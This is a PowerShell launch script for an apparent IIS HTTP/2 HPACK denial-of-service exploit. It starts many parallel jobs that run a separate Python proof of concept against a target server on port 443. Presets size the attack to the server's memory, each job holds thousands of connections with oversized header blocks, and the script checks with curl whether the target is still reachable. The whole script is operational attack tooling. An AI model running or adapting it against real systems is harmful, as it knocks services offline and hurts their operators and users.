# IIS HPACK DoS — Launch Script
# Launches parallel attack processes and monitors server memory.
#
# Usage:
#   .\launch_attack.ps1 -Target 192.168.1.100 -Preset 8gb
#   .\launch_attack.ps1 -Target 192.168.1.100 -NProcs 20 -Conns 2000

param(
    [Parameter(Mandatory=$true)]
    [string]$Target,

    [string]$Preset,
    [int]$NProcs,
    [int]$Conns,
    [string]$Poc = ".\iis_hpack_dos.py",
    [string]$Python = "python3"
)

# Preset table (processes x connections per process)
$presets = @{
    "8gb"  = @{ NProcs = 5;  Conns = 2000 }
    "32gb" = @{ NProcs = 10; Conns = 2000 }
    "64gb" = @{ NProcs = 20; Conns = 2000 }
    "96gb" = @{ NProcs = 50; Conns = 1000 }
}

if ($Preset) {
    if (-not $presets.ContainsKey($Preset)) {
        Write-Host "Unknown preset: $Preset. Use: 8gb, 32gb, 64gb, 96gb"
        exit 1
    }
    $NProcs = $presets[$Preset].NProcs
    $Conns = $presets[$Preset].Conns
}

if (-not $NProcs -or -not $Conns) {
    Write-Host "Specify -Preset or both -NProcs and -Conns"
    exit 1
}

$total = $NProcs * $Conns
Write-Host "=== IIS HPACK DoS ==="
Write-Host "Target:      $Target"
Write-Host "Processes:    $NProcs x $Conns connections = $total total"
Write-Host "Hold:         300s, drip every 5s"
Write-Host ""

# Verify first
Write-Host "[1] Verifying encoding..."
& $Python $Poc --host $Target --port 443 --mode verify 2>&1 | ForEach-Object { Write-Host "  $_" }
Write-Host ""

# Launch attack processes
Write-Host "[2] Launching $NProcs attack processes..."
$jobs = @()
for ($i = 0; $i -lt $NProcs; $i++) {
    $jobs += Start-Job -ScriptBlock {
        param($py, $s, $t, $n)
        & $py $s --host $t --port 443 --mode attack -n $n --streams 100 --headers 900 --hold 300 --drip-interval 5 --no-probe 2>&1
    } -ArgumentList $Python, $Poc, $Target, $Conns
}
Write-Host "  $($jobs.Count) processes launched"
Start-Sleep 2
Write-Host "  python3 processes: $((Get-Process python3 -EA SilentlyContinue).Count)"
Write-Host ""
Write-Host "[3] Attack running. Monitor accessibility from another machine:"
Write-Host "    curl -sk --http2 --max-time 3 https://${Target}/"
Write-Host ""
Write-Host "Waiting for attack to complete..."

# Wait and collect
$jobs | Wait-Job | Out-Null
foreach ($j in $jobs) {
    $r = Receive-Job $j -EA SilentlyContinue
    # Print just the results section from each process
    $inResults = $false
    foreach ($line in $r) {
        if ($line -match "RESULTS") { $inResults = $true }
        if ($inResults) { Write-Host $line }
        if ($line -match "Total streams") { $inResults = $false }
    }
}

Write-Host ""
Write-Host "=== DONE ==="
